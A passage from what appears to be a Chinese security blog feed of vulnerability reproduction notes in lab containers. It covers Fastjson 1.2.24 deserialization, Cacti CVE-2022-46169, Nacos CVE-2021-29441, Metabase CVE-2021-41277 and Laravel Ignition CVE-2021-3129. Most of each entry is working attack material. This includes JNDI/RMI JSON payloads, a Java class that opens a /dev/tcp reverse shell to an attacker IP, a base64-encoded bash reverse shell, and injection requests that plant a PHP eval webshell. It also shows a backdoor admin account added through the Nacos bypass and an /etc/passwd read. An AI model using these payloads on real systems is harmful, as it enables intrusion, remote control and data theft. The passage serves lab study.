alt="image-20230905194335821"></p><p>4.向靶场服务器发送Payload，带上RMI的地址，注意Content-Type应该是<code>application/json</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 123.56.181.14:8090</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://123.56.181.14:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905195720430.png" alt="image-20230905195720430" style="zoom:50%;"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905195823125.png" alt="image-20230905195823125" style="zoom:50%;"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905195921933.png" alt="image-20230905195921933">返回到容器内，命令<code>touch /tmp/success</code>已成功执行：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905201013455.png" alt="image-20230905201013455"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>同样，执行<code>javac TouchFile.java</code>，生成<code>TouchFile.class</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.174.128/9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以使用bash base64的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] commands = &#123;&quot;bash&quot;, &quot;-c&quot;,&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905201438758.png" alt="image-20230905201438758"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905201522736.png" alt="image-20230905201522736"></p><p>启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://123.56.181.14:8888/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure><p>发送POST请求包，因监听端口未发生变化，所以请求包内容与上方一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 123.56.181.14:8090</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://123.56.181.14:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送请求包之前，攻击机监听4444端口：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905202030449.png" alt="image-20230905202030449"></p><p>发送请求包，同时发生如下</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905202115815.png" alt="image-20230905202115815"></p><p>反弹成功</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905202431865.png" alt="image-20230905202431865"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Fastjson-1-2-24-反序列化导致任意命令执行漏洞&quot;&gt;&lt;a href=&quot;#Fastjson-1-2-24-反序列化导致任意命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;Fastjson 1.2.24 反序列化导致任意命令执行漏洞&quot;&gt;
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Java反序列化" scheme="http://yoursite.com/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Cacti 前台命令注入漏洞（CVE-2022-46169）</title>
    <link href="http://yoursite.com/2023/07/19/Cacti%20%E5%89%8D%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-46169%EF%BC%89/"/>
    <id>http://yoursite.com/2023/07/19/Cacti 前台命令注入漏洞（CVE-2022-46169）/</id>
    <published>2023-07-19T12:00:43.000Z</published>
    <updated>2023-10-29T11:55:27.247Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cacti-前台命令注入漏洞（CVE-2022-46169）"><a href="#Cacti-前台命令注入漏洞（CVE-2022-46169）" class="headerlink" title="Cacti 前台命令注入漏洞（CVE-2022-46169）"></a>Cacti 前台命令注入漏洞（CVE-2022-46169）</h1><p>Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p><blockquote><p>Cacti是一款用于网络监控和图形化展示的开源软件。它基于PHP和MySQL构建，提供了丰富的功能和易于使用的界面，可以帮助管理员监控网络设备、服务器、应用程序等的性能指标并进行可视化展示。</p><p>以下是Cacti的主要特点：</p><ol><li>图形化展示：Cacti可以通过轻松配置的方式，收集并绘制各种设备和应用程序的性能数据。它提供了丰富的图表类型和自定义选项，可以根据需求创建仪表盘、历史记录图和趋势图等。</li><li>数据收集和存储：Cacti支持使用SNMP、SSH、WMI等协议来收集设备的性能数据，并将这些数据存储在数据库中。它还提供了数据聚合和压缩功能，以减少存储空间的占用。</li><li>自动化图表生成：Cacti具有自动化图表生成功能，可以根据预先定义的模板和设备配置，自动生成图表。这样可以大大简化配置和管理工作，提高效率。</li><li>告警和通知：Cacti可以设置监控阈值，并在达到或超过阈值时触发告警。它支持多种告警方式，如电子邮件、短信、SNMP Trap等，可以及时通知管理员进行故障排查和问题解决。</li><li>插件和扩展性：Cacti提供了丰富的插件和扩展接口，使用户可以根据自己的需求来扩展和定制功能。这样可以将Cacti与其他系统集成，或是添加新的数据源和图表类型。</li></ol></blockquote><p>执行如下命令启动一个Cacti 1.2.22版本服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080</code>会跳转到登录页面。使用admin/admin作为账号密码登录，并根据页面中的提示进行初始化。</p><p>实际上初始化的过程就是不断点击“下一步”，直到安装成功：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904163830731.png" alt="image-20230904163830731"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904164032019.png" alt="image-20230904164032019"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904165024135.png" alt="image-20230904165024135"></p><p>这个漏洞的利用需要Cacti应用中至少存在一个类似是<code>POLLER_ACTION_SCRIPT_PHP</code>的采集器。所以，我们在Cacti后台首页创建一个新的Graph：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904165343918.png" alt="image-20230904165343918"></p><p>选择的Graph Type是“Device - Uptime”，点击创建：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904165506334.png" alt="image-20230904165506334"></p><p>完成上述初始化后，我们切换到攻击者的角色。作为攻击者，发送如下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`touch+/tmp/success` HTTP/1.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Host: 123.56.181.14:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://123.56.181.14:8080/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904190746183.png" alt="image-20230904190746183"></p><p>虽然响应包里没有回显，但是进入容器中即可发现<code>/tmp/success</code>已成功被创建：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904191128715.png" alt="image-20230904191128715"></p><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`echo+&apos;&lt;?php+phpinfo();?&gt;&apos;&gt;/var/www/html/test.php` HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904191902625.png" alt="image-20230904191902625"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904192010205.png" alt="image-20230904192010205"></p><h3 id="写入蚁剑webshell"><a href="#写入蚁剑webshell" class="headerlink" title="写入蚁剑webshell"></a>写入蚁剑webshell</h3><p>一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&lt;?php @eval($_POST[&apos;attack&apos;]);?&gt; </span><br><span class="line">GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`echo+&apos;&lt;?php+@eval($_POST[&apos;attack&apos;]);?&gt;&apos;&gt;/var/www/html/test.php` HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904192517120.png" alt="image-20230904192517120"></p><p>蚁剑连接</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904192543523.png" alt="image-20230904192543523"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cacti-前台命令注入漏洞（CVE-2022-46169）&quot;&gt;&lt;a href=&quot;#Cacti-前台命令注入漏洞（CVE-2022-46169）&quot; class=&quot;headerlink&quot; title=&quot;Cacti 前台命令注入漏洞（CVE-2022-46169）&quot;&gt;
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="命令注入" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Nacos 认证绕过漏洞（CVE-2021-29441）</title>
    <link href="http://yoursite.com/2023/03/01/Nacos%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-29441%EF%BC%89/"/>
    <id>http://yoursite.com/2023/03/01/Nacos 认证绕过漏洞（CVE-2021-29441）/</id>
    <published>2023-03-01T13:00:01.000Z</published>
    <updated>2023-10-29T11:59:38.556Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nacos-认证绕过漏洞（CVE-2021-29441）"><a href="#Nacos-认证绕过漏洞（CVE-2021-29441）" class="headerlink" title="Nacos 认证绕过漏洞（CVE-2021-29441）"></a>Nacos 认证绕过漏洞（CVE-2021-29441）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</p><p>该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。</p><p>参考链接：</p><ul><li><a href="https://github.com/advisories/GHSA-36hp-jr8h-556f" target="_blank" rel="noopener">https://github.com/advisories/GHSA-36hp-jr8h-556f</a></li></ul><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>运行漏洞环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>环境运行后，会开放3306、8848、9848、9555端口，在本次漏洞利用中，我们只需要用到8848端口，即web访问端口。<strong>执行漏洞验证过程时，请先访问8848端口，确认开放，某些情况下nacos服务会启动失败（无法连接数据库导致），可以重启nacos服务或者重启所有服务</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose restart nacos</span><br></pre></td></tr></table></figure><h2 id="漏洞利用脚本"><a href="#漏洞利用脚本" class="headerlink" title="漏洞利用脚本"></a>漏洞利用脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py http://target:8848</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞利用过程如下：</p><ol><li>修改User-Agent的值为Nacos-Server到请求包中</li><li>访问<code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code>查看状态码是否为200，且内容中是否包含<code>pageItems</code></li><li>使用POST方式访问<code>http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub</code>添加一个新用户</li><li>访问<code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code>获取已有的用户列表</li><li>访问<code>http://target:8848/nacos/</code>，使用添加的新用户(vulhub/vulhub)进行登录</li></ol><p><strong>检测漏洞是否存在</strong></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230913194923866.png" alt="image-20230913194923866"></p><p>添加Header头后访问<code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code>可以看到返回值为200，且内容中是否包含<code>pageItems</code>。</p><p><strong>添加新用户</strong></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230913195048825.png" alt="image-20230913195048825"></p><p>添加Header头后使用<strong>POST</strong>方式请求<code>http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub</code>添加一个新用户,账号密码都为vulhub</p><p><strong>使用新建的账号进行登录</strong></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230913195139890.png" alt="image-20230913195139890"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nacos-认证绕过漏洞（CVE-2021-29441）&quot;&gt;&lt;a href=&quot;#Nacos-认证绕过漏洞（CVE-2021-29441）&quot; class=&quot;headerlink&quot; title=&quot;Nacos 认证绕过漏洞（CVE-2021-29441）&quot;&gt;&lt;/a&gt;Na
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Nacos 认证绕过" scheme="http://yoursite.com/tags/Nacos-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>Metabase任意文件读取漏洞（CVE-2021-41277）</title>
    <link href="http://yoursite.com/2023/02/11/Metabase%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41277%EF%BC%89/"/>
    <id>http://yoursite.com/2023/02/11/Metabase任意文件读取漏洞（CVE-2021-41277）/</id>
    <published>2023-02-11T14:00:01.000Z</published>
    <updated>2023-10-29T11:58:42.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Metabase任意文件读取漏洞（CVE-2021-41277）"><a href="#Metabase任意文件读取漏洞（CVE-2021-41277）" class="headerlink" title="Metabase任意文件读取漏洞（CVE-2021-41277）"></a>Metabase任意文件读取漏洞（CVE-2021-41277）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Metabase是一个开源的数据分析平台。在其<strong>0.40.0到0.40.4版本</strong>中，GeoJSON URL验证功能存在远程文件读取漏洞，未授权的攻击者可以利用这个漏洞读取服务器上的任意文件，包括环境变量等。</p><p>参考链接：</p><ul><li><a href="https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr" target="_blank" rel="noopener">https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr</a></li><li><a href="https://github.com/tahtaciburak/CVE-2021-41277" target="_blank" rel="noopener">https://github.com/tahtaciburak/CVE-2021-41277</a></li></ul><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metabase 0.40.0-0.40.4</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个Metabase 0.40.4版本服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:3000</code>可以查看到Metabase的安装引导页面，我们填写初始账号密码（自己设置），并且跳过后续的数据库填写的步骤即可完成安装：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910215922566.png" alt="image-20230910215922566"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910215943458.png" alt="image-20230910215943458"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>执行以下命令读取<code>/etc/passwd</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://your-ip:3000/api/geojson?url=file:////etc/passwd</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910220202228.png" alt="image-20230910220202228"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Metabase任意文件读取漏洞（CVE-2021-41277）&quot;&gt;&lt;a href=&quot;#Metabase任意文件读取漏洞（CVE-2021-41277）&quot; class=&quot;headerlink&quot; title=&quot;Metabase任意文件读取漏洞（CVE-2021-41
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="任意文件读取" scheme="http://yoursite.com/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</title>
    <link href="http://yoursite.com/2023/01/17/Laravel%20Ignition%202.5.1%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-3129%EF%BC%89/"/>
    <id>http://yoursite.com/2023/01/17/Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）/</id>
    <published>2023-01-17T14:00:01.000Z</published>
    <updated>2023-10-29T11:58:04.278Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）"><a href="#Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）" class="headerlink" title="Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）"></a>Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Laravel是一个由Taylor Otwell所创建，免费的开源 PHP Web 框架。</p><blockquote><p>Laravel Ignition 是一个强大的错误和异常处理工具，它能够提供更好的错误诊断和调试体验，为 Laravel 的错误页面提供了更友好和可读性更强的设计</p></blockquote><p>在开发模式下，Laravel使用了Ignition提供的错误页面，在Ignition 2.5.1及之前的版本中，有类似这样的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$contents = file_get_contents($parameters[&apos;viewFile&apos;]);   #序列化</span><br><span class="line">file_put_contents($parameters[&apos;viewFile&apos;], $contents);    #反序列化</span><br></pre></td></tr></table></figure><p>Laravel &lt;= 8.4.2 存在远程代码执行漏洞，当Laravel开启了Debug模式时，由于Laravel自带的2.5.2之前的Ignition功能的某些接口和函数存在过滤不严，未经过身份验证的远程攻击者可以发起恶意请求，通过<strong>构造恶意Log文件等方式触发phar反序列化，从而造成远程代码执行</strong>，控制服务器。</p><p>参考链接：</p><ul><li><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></li><li><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></li><li><a href="https://www.freebuf.com/vuls/280416.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/280416.html</a></li><li><a href="https://cloud.tencent.com/developer/article/1797520" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1797520</a></li></ul><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Laravel&lt;=8.4.2</span><br><span class="line">Ignition&lt;2.5.2</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个运行着Laravel 8.4.2和Ignition 2.5.1的应用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看Laravel默认的欢迎页面。</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910194259406.png" alt="image-20230910194259406"></p><p>点击<strong>Generate app key</strong>生成应用程序密钥<br>至此环境搭建完成</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>想要利用该漏洞需要有几个步骤：</p><p>利用phpggc生成对应的phar文件→清空laravel.log → Log中增加前缀（填充字符，用于对齐），使得最终只出现一次 payload→将编码后的phar文件写入到log中→清除干扰字符→执行phar反序列化</p><p><strong>验证漏洞是否存在</strong></p><p>burpsuite抓取一个数据包，按照下图的形式修改并发送数据包</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910195124699.png" alt="image-20230910195124699"></p><p>页面出现了Ignition的报错，说明漏洞存在，且开启了debug模式。</p><p><strong>Laravel Debug mode RCE漏洞利用</strong></p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>一、利用phpggc生成对应的phar文件</p><p>通过在laravel的依赖里面找一条能够rce的链，生成对应的phar文件，并将phar文件base64编码，再将该base64编码后的字符进行convert.quoted-printable-encode编码</p><p>工具下载地址：git clone <a href="https://github.com/ambionics/phpggc.git" target="_blank" rel="noopener">https://github.com/ambionics/phpggc.git</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d <span class="string">"phar.readonly=0"</span> ./phpggc/phpggc Laravel/RCE5 <span class="string">"phpinfo();"</span> --phar phar -o php:<span class="comment">//output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</span></span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910200353296.png" alt="image-20230910200353296"></p><p>得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：</p><p><img src="https://img-blog.csdnimg.cn/dd8b1da0ee1046fb8a9ddb7a00e1c9be.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>二、清空laravel.log</p><p>使用php://filter中的convert.base64-decode过滤器的特性，将log清空。</p><p>发送如下数据包，将Laravel的原日志文件laravel.log清空：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span 